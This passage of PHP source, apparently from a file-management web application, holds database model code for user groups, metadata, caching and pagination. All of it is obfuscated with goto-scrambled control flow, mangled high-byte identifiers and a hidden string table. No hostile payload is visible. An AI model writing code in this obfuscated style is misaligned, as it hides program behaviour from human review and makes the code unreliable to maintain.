(!$DÙ«Ü‰ØÛŞ) { return; } array_remove_key($DÙ«Ü‰ØÛŞ, $E‚Ñ³»Ø³Ÿ[872]); goto dÉŒ—‘£…½; e¸¡ğ®ÒÔ: $this->_listAppendSourceRoot($DÙ«Ü‰ØÛŞ, $dÏô¤Ìö§); goto AÄíÀ‹º·¸; AÄíÀ‹º·¸: } private function _listAppendSourceRoot(&$e×±‘¦Ş, $eÇÙëğØÅÒ) { goto fÃÎ÷®¥±§; cŠùÆŞáî¢: foreach ($e×±‘¦Ş as &$b÷êòïøƒ) { $b÷êòïøƒ[$fËœÅ¢‚·—[85]] = $C§ÌÄÄáÏÀ[$b÷êòïøƒ[$fËœÅ¢‚·—[1550]]] ? $C§ÌÄÄáÏÀ[$b÷êòïøƒ[$fËœÅ¢‚·—[1550]]] : array(); } unset($b÷êòïøƒ); goto c¶‚·‰¨‰; fÃÎ÷®¥±§: $fËœÅ¢‚·— =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cëàí¶·° = array($fËœÅ¢‚·—[492] => 0, $fËœÅ¢‚·—[498] => array($fËœÅ¢‚·—[7], $eÇÙëğØÅÒ), $fËœÅ¢‚·—[406] => SourceModel::TYPE_USER); $f¡¼ğí„‹ = Model($fËœÅ¢‚·—[813])->order($fËœÅ¢‚·—[1817])->field($fËœÅ¢‚·—[1818]); goto E¤òöåÄÆ; E¤òöåÄÆ: $C§ÌÄÄáÏÀ = $f¡¼ğí„‹->limit(count($eÇÙëğØÅÒ))->where($cëàí¶·°)->select(); $C§ÌÄÄáÏÀ = array_to_keyvalue($C§ÌÄÄáÏÀ, $fËœÅ¢‚·—[498]); $C§ÌÄÄáÏÀ = array_remove_key($C§ÌÄÄáÏÀ, $fËœÅ¢‚·—[498]); goto cŠùÆŞáî¢; c¶‚·‰¨‰: } private function _listAppendGroup(&$a±ô¡µ²á, $D•´‹‡‚Çë) { goto eÛ¢á´¼Ë‡; fñ¡Ö‹ÇğÊ: foreach ($a±ô¡µ²á as &$cêÎš‚ê‹) { $cêÎš‚ê‹[$d™ÜªøÇ×[1896]] = array(); if (isset($C®ªÚ­®éÀ[$cêÎš‚ê‹[$d™ÜªøÇ×[1550]]])) { $cêÎš‚ê‹[$d™ÜªøÇ×[1896]] = $C®ªÚ­®éÀ[$cêÎš‚ê‹[$d™ÜªøÇ×[1550]]]; } } unset($cêÎš‚ê‹); goto f‹…ôÓ¯äÚ; F¼×¯Ä˜àÜ: $cé²ö„ ê = array_to_keyvalue($C®ªÚ­®éÀ, $d™ÜªøÇ×[33], $d™ÜªøÇ×[1719]); $cé²ö„ ê = array_remove_value(array_unique($cé²ö„ ê), $d™ÜªøÇ×[191]); if (!$cé²ö„ ê || !$C®ªÚ­®éÀ) { return; } goto b¤ÀŸãÈ§; eÛ¢á´¼Ë‡: $d™ÜªøÇ× =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f¿…Ã«ÉÔ¯ = array($d™ÜªøÇ×[1550] => array($d™ÜªøÇ×[7], $D•´‹‡‚Çë)); $C®ªÚ­®éÀ = Model($d™ÜªøÇ×[1805])->where($f¿…Ã«ÉÔ¯)->select(); goto F¼×¯Ä˜àÜ; b¤ÀŸãÈ§: $f¿…Ã«ÉÔ¯ = array($d™ÜªøÇ×[1719] => array($d™ÜªøÇ×[7], $cé²ö„ ê)); $dÇÄ¹´‰Ìë = Model($d™ÜªøÇ×[1894])->field($d™ÜªøÇ×[2186])->where($f¿…Ã«ÉÔ¯)->select(); $dÇÄ¹´‰Ìë = array_to_keyvalue($dÇÄ¹´‰Ìë, $d™ÜªøÇ×[1719]); goto Fåïù…£šÉ; Fåïù…£šÉ: $C®ªÚ­®éÀ = array_to_keyvalue_group($C®ªÚ­®éÀ, $d™ÜªøÇ×[1550]); foreach ($C®ªÚ­®éÀ as &$EßÜÛò¤‘“) { $a„£Şê§×Ş = array(); foreach ($EßÜÛò¤‘“ as $fœ×Çã™’“) { if (!$fœ×Çã™’“[$d™ÜªøÇ×[1819]]) { continue; } $D…£°Œ•§ = Model($d™ÜªøÇ×[501])->listData($fœ×Çã™’“[$d™ÜªøÇ×[1819]]); $a„£Şê§×Ş[] = array($d™ÜªøÇ×[1719] => $fœ×Çã™’“[$d™ÜªøÇ×[1719]], $d™ÜªøÇ×[2187] => $dÇÄ¹´‰Ìë[$fœ×Çã™’“[$d™ÜªøÇ×[1719]]][$d™ÜªøÇ×[28]], $d™ÜªøÇ×[515] => $dÇÄ¹´‰Ìë[$fœ×Çã™’“[$d™ÜªøÇ×[1719]]][$d™ÜªøÇ×[515]], $d™ÜªøÇ×[408] => $D…£°Œ•§); } $EßÜÛò¤‘“ = $a„£Şê§×Ş; } unset($EßÜÛò¤‘“); goto fñ¡Ö‹ÇğÊ; f‹…ôÓ¯äÚ: } public function userAppendGroup($F£Úˆ­áİÎ) { $a¹è·õ‚“ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$F£Úˆ­áİÎ) { return array(); } $this->_listAppendGroup($F£Úˆ­áİÎ, array_to_keyvalue($F£Úˆ­áİÎ, $a¹è·õ‚“[33], $a¹è·õ‚“[1550])); return $F£Úˆ­áİÎ; } private function _listAppendMeta(&$eˆßÕ£ŸíŒ, $B‰É”Æ‡˜) { goto bÚ¦¿“Ä¸Õ; a‹ÛÀš¹í¨: $dŠË¾£Ñ¼ì = array($A¨õìÍÊ“[1550] => array($A¨õìÍÊ“[7], $B‰É”Æ‡˜)); $F×Ş´÷µ¾ = Model($A¨õìÍÊ“[2164])->where($dŠË¾£Ñ¼ì)->select(); $F×Ş´÷µ¾ = array_to_keyvalue_group($F×Ş´÷µ¾, $A¨õìÍÊ“[1550]); goto DÕŒêÓé±…; bÚ¦¿“Ä¸Õ: $A¨õìÍÊ“ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aéÜöºÆ–É = UserJobModel::JOB_KEY; $d•„®˜Ù¾§ = array($A¨õìÍÊ“[2166]); goto a‹ÛÀš¹í¨; DÕŒêÓé±…: foreach ($F×Ş´÷µ¾ as &$E¶ˆ«ôÆÖ) { $A¬ùˆ›’º = array(); foreach ($E¶ˆ«ôÆÖ as $cÛ·Ä°¤Æ) { if (!in_array($cÛ·Ä°¤Æ[$A¨õìÍÊ“[93]], $d•„®˜Ù¾§)) { $A¬ùˆ›’º[$cÛ·Ä°¤Æ[$A¨õìÍÊ“[93]]] = $cÛ·Ä°¤Æ[$A¨õìÍÊ“[372]]; } } $E¶ˆ«ôÆÖ = $A¬ùˆ›’º; } unset($E¶ˆ«ôÆÖ); $DÛ®Ö´Ó­ = Model($A¨õìÍÊ“[2188]); goto Dâ ô¬…è; Dâ ô¬…è: foreach ($eˆßÕ£ŸíŒ as &$E‡Ë£ÏÛ­­) { $BñÀÊö®ÂÇ = array(); if (isset($F×Ş´÷µ¾[$E‡Ë£ÏÛ­­[$A¨õìÍÊ“[1550]]])) { $BñÀÊö®ÂÇ = $F×Ş´÷µ¾[$E‡Ë£ÏÛ­­[$A¨õìÍÊ“[1550]]]; } $E‡Ë£ÏÛ­­[$A¨õìÍÊ“[2189]] = array(); if (isset($BñÀÊö®ÂÇ[$aéÜöºÆ–É])) { $E‡Ë£ÏÛ­­[$A¨õìÍÊ“[2189]] = $DÛ®Ö´Ó­->getUserJobInfo($BñÀÊö®ÂÇ[$aéÜöºÆ–É]); } } unset($E‡Ë£ÏÛ­­); goto eßÁêëóÂÕ; eßÁêëóÂÕ: } protected function groupUserAll($Cí†‹ôğ²é) { $FœÎµÎ£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$Cí†‹ôğ²é) { return !1; } $B¼ÕºàôöÑ = Model($FœÎµÎ£[1805])->field($FœÎµÎ£[1550])->where(array($FœÎµÎ£[1719] => array($FœÎµÎ£[7], $Cí†‹ôğ²é)))->select(); $B¼ÕºàôöÑ = array_to_keyvalue($B¼ÕºàôöÑ, $FœÎµÎ£[33], $FœÎµÎ£[1550]); return array_unique($B¼ÕºàôöÑ); } public function userSearch($a´Ì›ªÆ, $A’”ÀÌ¡»Ì = "\52") { return Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][532])->where($a´Ì›ªÆ)->field($A’”ÀÌ¡»Ì)->find(); } } goto aœÂ­ÍêµŞ; e¬ŠÏƒÚ¯Á: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\171\x54\151\155\145", "\164\x69\155\145", "\151\x6e\x73\x65\x72\164\54\165\x70\x64\x61\164\x65", "\x66\165\x6e\143\x74\151\x6f\156"), array("\143\162\145\141\x74\x65\x54\x69\x6d\x65", "\164\151\x6d\145", "\x69\x6e\163\145\162\164", "\146\165\156\143\x74\x69\x6f\x6e")); public function setDataAuto($cìê´©²ï) { $this->dataAuto = $cìê´©²ï; } public function __construct($eÁÚÒœëŞ« = '', $E¡Ù·æäÄ¥ = '', $fØøÒß†Âá = '') { parent::__construct($eÁÚÒœëŞ«, $E¡Ù·æäÄ¥, $fØøÒß†Âá); } protected $tableMeta = array(); protected function _beforeInsert(&$Fæ’Æ«Õæ, $aš°Ñ¶†ŸŒ) { $e‡œåÆ—Ë =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->checkDataAutoHas($e‡œåÆ—Ë[353])) { return; } $this->dataBeforeFilter($Fæ’Æ«Õæ, $e‡œåÆ—Ë[353]); } protected function _beforeUpdate(&$E¢†¾Ã™´³, $fËî×äÙÛÒ) { $B¥¨ÂÆÈ›¨ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->checkDataAutoHas($B¥¨ÂÆÈ›¨[354])) { return; } $this->dataBeforeFilter($E¢†¾Ã™´³, $B¥¨ÂÆÈ›¨[354]); } protected function _afterSelect(&$DÔà³‹é·, $d¿ì‚Åø‡) { if (!is_array($DÔà³‹é·)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ôğ—¤Šµˆ˜ñ£][355])) { return; } foreach ($DÔà³‹é· as &$f¤…ÍÊô™¦) { $this->dataAfterFilter($f¤…ÍÊô™¦); } unset($f¤…ÍÊô™¦); } protected function _afterFind(&$dĞ‚×ƒ¡¾§, $C‰å©õÑ¥´) { if (!is_array($dĞ‚×ƒ¡¾§)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ôğ—¤Šµˆ˜ñ£][355])) { return; } $this->dataAfterFilter($dĞ‚×ƒ¡¾§); } public static function textEncode($fÆÜ§ó“¯‰) { if (!$fÆÜ§ó“¯‰) { return $fÆÜ§ó“¯‰; } $eˆŸÏÒÃ› = json_encode($fÆÜ§ó“¯‰); $eˆŸÏÒÃ› = preg_replace_callback($_SERVER[Ôğ—¤Šµˆ˜ñ£][356], function ($DÌÌ‰‘Ä™) { return addslashes($DÌÌ‰‘Ä™[0]); }, $eˆŸÏÒÃ›); return json_decode($eˆŸÏÒÃ›); } public static function textDecode($BŒÍÓô‡ïÂ) { $D„ì†¦‹”… =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C õööĞš  = json_encode($BŒÍÓô‡ïÂ); $C õööĞš  = preg_replace_callback($D„ì†¦‹”…[357], function ($dî†É®Ê÷) { return $_SERVER[Ôğ—¤Šµˆ˜ñ£][97]; }, $C õööĞš ); return json_decode($C õööĞš ); } public function setAutoIncrement($Eë÷ºíŸÜ) { $EÚ´æÏ«½© = array($this->getPk() => $Eë÷ºíŸÜ); $bİäå†çÕ = $this->data($EÚ´æÏ«½©)->add(); if ($bİäå†çÕ) { $this->delete($bİäå†çÕ); } } public function getAutoIncrement() { $D¦œˆê®¡ = $this->getTableName(); $c°¡Á‰´Æ = $this->max($this->getPk()); $dùæó‘²¥ = $this->query("\x73\x68\x6f\x77\x20\164\x61\x62\x6c\145\x20\x73\164\x61\x74\165\163\x20\x77\x68\x65\162\x65\x20\x4e\x61\x6d\145\x3d\x27{$D¦œˆê®¡}\x27"); $A¾åç„ÏÒŒ = $dùæó‘²¥[0][$_SERVER[Ôğ—¤Šµˆ˜ñ£][358]]; $D‰½· ¿œ… = max($c°¡Á‰´Æ, $A¾åç„ÏÒŒ); return $D‰½· ¿œ…; } protected function _callBefore($B‚›ò…¢ ­, $bŠäÔÏ‚) { return $this->cacheCallCheck($B‚›ò…¢ ­, $bŠäÔÏ‚, !1); } protected function _callAfter($d‘Çá¤ô†Ê, $e¦Å÷ÙŞÀ ) { return $this->cacheCallCheck($d‘Çá¤ô†Ê, $e¦Å÷ÙŞÀ , !0); } protected function cacheFunctionAlias($AÊ˜íàÃ„) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($dÒæé¥¹ƒ, $D‰ĞŞåÅ‰—, $cŠÕ¥ á×Ç = false) { $FÚØÒ‹ = $this->cacheFunctionAlias($D‰ĞŞåÅ‰—); if (!$FÚØÒ‹) { return; } foreach ($FÚØÒ‹ as $b˜Çóğ÷°† => $Cõ›Å‘ß) { $BÎ¤×¢Ò›Œ = $Cõ›Å‘ß[0]; $FØÓ±õ¹’¹ = explode($_SERVER[Ôğ—¤Šµˆ˜ñ£][47], $Cõ›Å‘ß[1]); if ($dÒæé¥¹ƒ == $b˜Çóğ÷°†) { return $this->cacheFunctionGet($b˜Çóğ÷°†, $BÎ¤×¢Ò›Œ); } if ($cŠÕ¥ á×Ç && in_array($dÒæé¥¹ƒ, $FØÓ±õ¹’¹)) { $this->cacheFunctionClear($b˜Çóğ÷°†, $BÎ¤×¢Ò›Œ); } } } public function cacheFunctionGet($FÌº¤äªäƒ, $DÁÚÏ˜¶åˆ) { $a–§¨•Éµ = $this->cacheKeyMake($FÌº¤äªäƒ, $DÁÚÏ˜¶åˆ); $D¸êÈ„¾«ñ = Cache::get($a–§¨•Éµ); if (!is_array($D¸êÈ„¾«ñ)) { $D¸êÈ„¾«ñ = call_user_func_array(array($this, $FÌº¤äªäƒ), array($DÁÚÏ˜¶åˆ, !0)); Cache::set($a–§¨•Éµ, $D¸êÈ„¾«ñ); } return $D¸êÈ„¾«ñ; } public function cacheFunctionClear($D®„¦°ÌÊÅ, $BË¥Ğ™˜—) { $eÛø†Íš¢Ø = $BË¥Ğ™˜—; if (!is_array($BË¥Ğ™˜—)) { $eÛø†Íš¢Ø = array($BË¥Ğ™˜—); } foreach ($eÛø†Íš¢Ø as $aâ­Âß…Ç¸) { $BÇ¾¡ÆÄº£ = $this->cacheKeyMake($D®„¦°ÌÊÅ, $aâ­Âß…Ç¸); Cache::remove($BÇ¾¡ÆÄº£); } } private function cacheKeyMake($FÃ§à¨¹Âö, $F‰®ğ‹ó´) { $fÈî×´¹¹¦ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return get_class($this) . $fÈî×´¹¹¦[71] . $FÃ§à¨¹Âö . $fÈî×´¹¹¦[359] . $F‰®ğ‹ó´; } protected function selectPageReset() { $A¨äáåØğ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (isset($GLOBALS[$A¨äáåØğ[360]])) { return; } $GLOBALS[$A¨äáåØğ[360]] = isset($GLOBALS[$A¨äáåØğ[7]][$A¨äáåØğ[361]]) ? $GLOBALS[$A¨äáåØğ[7]][$A¨äáåØğ[361]] : !1; $GLOBALS[$A¨äáåØğ[362]] = isset($GLOBALS[$A¨äáåØğ[7]][$A¨äáåØğ[351]]) ? $GLOBALS[$A¨äáåØğ[7]][$A¨äáåØğ[351]] : !1; $GLOBALS[$A¨äáåØğ[7]][$A¨äáåØğ[361]] = !1; $GLOBALS[$A¨äáåØğ[7]][$A¨äáåØğ[351]] = !1; } protected function selectPageRestore() { $CÛÏªŠ¬³È =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($GLOBALS[$CÛÏªŠ¬³È[360]])) { return; } $GLOBALS[$CÛÏªŠ¬³È[7]][$CÛÏªŠ¬³È[361]] = $GLOBALS[$CÛÏªŠ¬³È[360]]; $GLOBALS[$CÛÏªŠ¬³È[7]][$CÛÏªŠ¬³È[351]] = $GLOBALS[$CÛÏªŠ¬³È[362]]; unset($GLOBALS[$CÛÏªŠ¬³È[360]]); unset($GLOBALS[$CÛÏªŠ¬³È[362]]); } protected function selectPage($b¡Ù›šŸÖŞ = 200, $FËÚ“ÁÆÎö = 1) { goto A¹õ´Œƒø; cç¨òµĞ‰ñ: $eÂèàĞ¤Ëõ = $Fº¾Æ‚ó‹½; $eÂèàĞ¤Ëõ[$Fİã–Â¾˜Ï[363]] = array(); $b¡Ù›šŸÖŞ = intval($b¡Ù›šŸÖŞ); goto FÁç’£Øƒ°; FÁç’£Øƒ°: $b¡Ù›šŸÖŞ = $b¡Ù›šŸÖŞ <= 5 ? 5 : ($b¡Ù›šŸÖŞ >= $eÖ“ô„Ë ? $eÖ“ô„Ë : $b¡Ù›šŸÖŞ); $FËÚ“ÁÆÎö = intval(isset($in[$Fİã–Â¾˜Ï[351]]) && $in[$Fİã–Â¾˜Ï[351]] ? $in[$Fİã–Â¾˜Ï[351]] : $FËÚ“ÁÆÎö); $FËÚ“ÁÆÎö = $FËÚ“ÁÆÎö <= 1 ? 1 : $FËÚ“ÁÆÎö; goto fä¢ÏÍ£¼; fä¢ÏÍ£¼: $AÑÚÊ¿²˜ = array(); $C¸·®ÍĞ‘ = 1; if ($FËÚ“ÁÆÎö == 1 && $C¸·®ÍĞ‘) { $this->optionsValue($Fº¾Æ‚ó‹½); $AÑÚÊ¿²˜ = $this->page($FËÚ“ÁÆÎö, $b¡Ù›šŸÖŞ)->select(); $a£’¾óíñÛ = is_array($AÑÚÊ¿²˜) ? count($AÑÚÊ¿²˜) : 0; if ($a£’¾óíñÛ < $b¡Ù›šŸÖŞ) { $DŠÅíÀïÒ© = 1; } else { $this->optionsValue($eÂèàĞ¤Ëõ); $a£’¾óíñÛ = intval($this->count()); $DŠÅíÀïÒ© = ceil($a£’¾óíñÛ / $b¡Ù›šŸÖŞ); } } else { $this->optionsValue($eÂèàĞ¤Ëõ); $a£’¾óíñÛ = intval($this->count()); $DŠÅíÀïÒ© = ceil($a£’¾óíñÛ / $b¡Ù›šŸÖŞ); $FËÚ“ÁÆÎö = $FËÚ“ÁÆÎö >= $DŠÅíÀïÒ© ? $DŠÅíÀïÒ© : $FËÚ“ÁÆÎö; $this->optionsValue($Fº¾Æ‚ó‹½); $AÑÚÊ¿²˜ = $this->page($FËÚ“ÁÆÎö, $b¡Ù›šŸÖŞ)->select(); } goto Aöğõ¨ğµæ; Aöğõ¨ğµæ: if (!is_array($AÑÚÊ¿²˜)) { $AÑÚÊ¿²˜ = array(); } if ($DŠÅíÀïÒ© == 1) { $a£’¾óíñÛ = count($AÑÚÊ¿²˜); } $b†·©ƒùĞô = array($Fİã–Â¾˜Ï[364] => array($Fİã–Â¾˜Ï[365] => $a£’¾óíñÛ, $Fİã–Â¾˜Ï[361] => $b¡Ù›šŸÖŞ, $Fİã–Â¾˜Ï[351] => $FËÚ“ÁÆÎö, $Fİã–Â¾˜Ï[366] => $DŠÅíÀïÒ©), $Fİã–Â¾˜Ï[367] => $AÑÚÊ¿²˜); goto Eå„ç¨˜¦; CÃŠ”‹††Ä: $eÖ“ô„Ë = 50000; $b¡Ù›šŸÖŞ = isset($in[$Fİã–Â¾˜Ï[361]]) && $in[$Fİã–Â¾˜Ï[361]] ? $in[$Fİã–Â¾˜Ï[361]] : $b¡Ù›šŸÖŞ; if ($b¡Ù›šŸÖŞ === -1) { $in[$Fİã–Â¾˜Ï[361]] = !1; $eÖ“ô„Ë = 100000000; $b¡Ù›šŸÖŞ = $eÖ“ô„Ë; } goto cç¨òµĞ‰ñ; A¹õ´Œƒø: $Fİã–Â¾˜Ï =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; global $in; $Fº¾Æ‚ó‹½ = $this->optionsValue(); goto CÃŠ”‹††Ä; Eå„ç¨˜¦: return $b†·©ƒùĞô; goto d¼Š—¦ƒµŒ; d¼Š—¦ƒµŒ: } protected function checkLength($CŞ»ó˜œæ, $A³ÈæÖ†–Â = 0, $AÈÇ¿µïĞÑ = '') { $dŠÏ«‡Ü» =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A³ÈæÖ†–Â = $A³ÈæÖ†–Â ? $A³ÈæÖ†–Â : 65536; if (!$CŞ»ó˜œæ || strlen($CŞ»ó˜œæ) < $A³ÈæÖ†–Â) { return; } $AÈÇ¿µïĞÑ = $AÈÇ¿µïĞÑ ? $AÈÇ¿µïĞÑ . $dŠÏ«‡Ü»[68] : $dŠÏ«‡Ü»[33]; show_json($AÈÇ¿µïĞÑ . LNG($dŠÏ«‡Ü»[368]) . "\50{$A³ÈæÖ†–Â}\51", !1); } protected function metaSet($d¦Ø˜¦‚Œµ, $CÖÁí”ÚÛÙ = null, $fîğƒ³Ò›£ = null) { goto dØëæù½”°; f÷áòÑ®¸ˆ: if (is_null($CÖÁí”ÚÛÙ)) { return $B¯Û¯º‡¦É->where(array($a·Œ›æ°° => $d¦Ø˜¦‚Œµ))->delete(); } if (is_null($fîğƒ³Ò›£) && is_string($CÖÁí”ÚÛÙ)) { return $B¯Û¯º‡¦É->where($Cõé°÷®¥–)->delete(); } $FÂ¶ëÙæÙô = is_array($CÖÁí”ÚÛÙ) ? $CÖÁí”ÚÛÙ : array(); goto d˜êµó»”; F¹é®´¦: CacheLock::unlock($Aøê ¤ˆÔÊ); return !0; goto b°Šã“¦Ûà; d˜êµó»”: if (is_string($CÖÁí”ÚÛÙ)) { $FÂ¶ëÙæÙô[$CÖÁí”ÚÛÙ] = $fîğƒ³Ò›£; } $e¡â¹Ñïó = array(); foreach ($FÂ¶ëÙæÙô as $d¦‰ê¨‘å => $fÆÚ‹Ûğ½—) { if (is_null($fÆÚ‹Ûğ½—) && is_string($d¦‰ê¨‘å)) { $B¯Û¯º‡¦É->where(array($a·Œ›æ°° => $d¦Ø˜¦‚Œµ, $fò³ùŞá†Á[371] => $d¦‰ê¨‘å))->delete(); continue; } $this->checkLength($fÆÚ‹Ûğ½—, !1, $BÍñÔìù‰ . $fò³ùŞá†Á[4] . $d¦‰ê¨‘å); $e¡â¹Ñïó[] = array($a·Œ›æ°° => $d¦Ø˜¦‚Œµ, $fò³ùŞá†Á[93] => $d¦‰ê¨‘å, $fò³ùŞá†Á[372] => $fÆÚ‹Ûğ½—); } goto C¼„÷Ïê”Ş; dØëæù½”°: $fò³ùŞá†Á =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->tableMeta || !$d¦Ø˜¦‚Œµ) { return !1; } $a·Œ›æ°° = $this->tableMeta[$fò³ùŞá†Á[369]]; goto dÔÆ“Åƒ›; dÔÆ“Åƒ›: $BÍñÔìù‰ = $this->tableMeta[$fò³ùŞá†Á[370]]; $B¯Û¯º‡¦É = Model($BÍñÔìù‰); $Cõé°÷®¥– = array($a·Œ›æ°° => $d¦Ø˜¦‚Œµ, $fò³ùŞá†Á[371] => $CÖÁí”ÚÛÙ); goto f÷áòÑ®¸ˆ; C¼„÷Ïê”Ş: $Aøê ¤ˆÔÊ = $fò³ùŞá†Á[373] . $this->tableMeta; CacheLock::lock($Aøê ¤ˆÔÊ); $B¯Û¯º‡¦É->where(array($a·Œ›æ°° => $d¦Ø˜¦‚Œµ))->addAll($e¡â¹Ñïó, array(), !0); goto F¹é®´¦; b°Šã“¦Ûà: } public function metaGet($dØ ƒÖ–‚¢, $cğ˜ ±¡´š = false) { goto dŸš”ğìÚ; FÜ÷ÔˆØ—è: $A®«‹„ß‰£ = Model($this->tableMeta[$a‚ÖÎá•Œ‚[370]]); if ($cğ˜ ±¡´š) { $AÓ¶¦ĞŒİÖ = array($Eí¿·‡Š·Ü => $dØ ƒÖ–‚¢, $a‚ÖÎá•Œ‚[93] => $cğ˜ ±¡´š); return $A®«‹„ß‰£->where($AÓ¶¦ĞŒİÖ)->getField($a‚ÖÎá•Œ‚[372]); } $AÓ¶¦ĞŒİÖ = array($Eí¿·‡Š·Ü => $dØ ƒÖ–‚¢); goto eÅô›¡à¬ğ; dŸš”ğìÚ: $a‚ÖÎá•Œ‚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->tableMeta) { return array(); } $Eí¿·‡Š·Ü = $this->tableMeta[$a‚ÖÎá•Œ‚[369]]; goto FÜ÷ÔˆØ—è; eÅô›¡à¬ğ: $d¹àÌÙ¡Ò = $A®«‹„ß‰£->field($a‚ÖÎá•Œ‚[374])->where($AÓ¶¦ĞŒİÖ)->select(); $d¹àÌÙ¡Ò = array_to_keyvalue($d¹àÌÙ¡Ò, $a‚ÖÎá•Œ‚[93], $a‚ÖÎá•Œ‚[372]); return $d¹àÌÙ¡Ò; goto fë¦¢Â‹Ğ÷; fë¦¢Â‹Ğ÷: } private function checkDataAutoHas($cÒ¡Î§‰Œ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $E¶¼ã‚‘ßÂ) { if (in_array($cÒ¡Î§‰Œ, explode($_SERVER[Ôğ—¤Šµˆ˜ñ£][47], $E¶¼ã‚‘ßÂ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$EäÒñÛİô¼, $FÔ„ª¥ê„ò) { $bµ¸‚¹Â© =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; foreach ($this->dataAuto as $c¿»ƒ÷Û™) { $a“È‡­ªø = $c¿»ƒ÷Û™[0]; if (!in_array($FÔ„ª¥ê„ò, explode($bµ¸‚¹Â©[47], $c¿»ƒ÷Û™[2]))) { continue; } switch (trim($c¿»ƒ÷Û™[3])) { case $bµ¸‚¹Â©[319]: case $bµ¸‚¹Â©[320]: $Cö‹¤ô­½¿ = $c¿»ƒ÷Û™[1]; $A¯ŒËïº»ƒ = isset($c¿»ƒ÷Û™[4]) ? (array) $c¿»ƒ÷Û™[4] : array(); if ($Cö‹¤ô­½¿ == $bµ¸‚¹Â©[197] && array_key_exists($a“È‡­ªø, $EäÒñÛİô¼)) { if (!$EäÒñÛİô¼[$a“È‡­ªø]) { unset($EäÒñÛİô¼[$a“È‡­ªø]); } break; } if (isset($EäÒñÛİô¼[$a“È‡­ªø])) { array_unshift($A¯ŒËïº»ƒ, $EäÒñÛİô¼[$a“È‡­ªø]); } if ($bµ¸‚¹Â©[319] == $c¿»ƒ÷Û™[3]) { $EäÒñÛİô¼[$a“È‡­ªø] = call_user_func_array($Cö‹¤ô­½¿, $A¯ŒËïº»ƒ); } else { $EäÒñÛİô¼[$a“È‡­ªø] = call_user_func_array(array(&$this, $Cö‹¤ô­½¿), $A¯ŒËïº»ƒ); } break; case $bµ¸‚¹Â©[268]: if (isset($EäÒñÛİô¼[$a“È‡­ªø]) && $EäÒñÛİô¼[$a“È‡­ªø]) { $EäÒñÛİô¼[$a“È‡­ªø] = call_user_func_array(array(&$this, $c¿»ƒ÷Û™[1]), array($EäÒñÛİô¼[$a“È‡­ªø])); } break; case $bµ¸‚¹Â©[271]: $EäÒñÛİô¼[$a“È‡­ªø] = $EäÒñÛİô¼[$c¿»ƒ÷Û™[1]]; break; case $bµ¸‚¹Â©[292]: if (isset($EäÒñÛİô¼[$a“È‡­ªø]) && !is_string($EäÒñÛİô¼[$a“È‡­ªø])) { $EäÒñÛİô¼[$a“È‡­ªø] = json_encode_force($EäÒñÛİô¼[$a“È‡­ªø]); } break; case $bµ¸‚¹Â©[321]: if ($EäÒñÛİô¼[$a“È‡­ªø] === $bµ¸‚¹Â©[33]) { unset($EäÒñÛİô¼[$a“È‡­ªø]); } break; case $bµ¸‚¹Â©[322]: $EäÒñÛİô¼[$a“È‡­ªø] = $c¿»ƒ÷Û™[1]; default: break; } } if ($FÔ„ª¥ê„ò == $bµ¸‚¹Â©[353]) { $EµÚÉ„¥‡Ï = strtolower($this->db->getDbType()); if (strpos($EµÚÉ„¥‡Ï, $bµ¸‚¹Â©[9]) !== 0) { return; } $EéèÔÎ½îŒ = $this->field(!0)->fields; $B®øíç¡ = $EéèÔÎ½îŒ[$bµ¸‚¹Â©[250]]; if (isset($EéèÔÎ½îŒ[$bµ¸‚¹Â©[249]])) { unset($B®øíç¡[$EéèÔÎ½îŒ[$bµ¸‚¹Â©[249]]]); } foreach ($B®øíç¡ as $fïªÉ×Ùñß => $FÔ„ª¥ê„ò) { if (!isset($EäÒñÛİô¼[$fïªÉ×Ùñß])) { $EäÒñÛİô¼[$fïªÉ×Ùñß] = $bµ¸‚¹Â©[33]; } } } } private function dataAfterFilter(&$BÅÄ°ŞÕ‡÷) { $cïÀ´ïÒƒø =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; foreach ($this->dataAuto as $d‘ìÛÛ‘ê½) { $Bç´ŠÁ³é’ = $d‘ìÛÛ‘ê½[0]; if (!isset($BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’])) { continue; } if (!in_array($cïÀ´ïÒƒø[355], explode($cïÀ´ïÒƒø[47], $d‘ìÛÛ‘ê½[2]))) { continue; } switch (trim($d‘ìÛÛ‘ê½[3])) { case $cïÀ´ïÒƒø[319]: case $cïÀ´ïÒƒø[320]: $eÂ İ×´œ = isset($d‘ìÛÛ‘ê½[4]) ? (array) $d‘ìÛÛ‘ê½[4] : array(); array_unshift($eÂ İ×´œ, $BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’]); if (isset($d‘ìÛÛ‘ê½[4]) && $d‘ìÛÛ‘ê½[4] == $cïÀ´ïÒƒø[375]) { $eÂ İ×´œ = array($BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’]); } if ($cïÀ´ïÒƒø[319] == $d‘ìÛÛ‘ê½[3]) { $BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’] = call_user_func_array($d‘ìÛÛ‘ê½[1], $eÂ İ×´œ); } else { 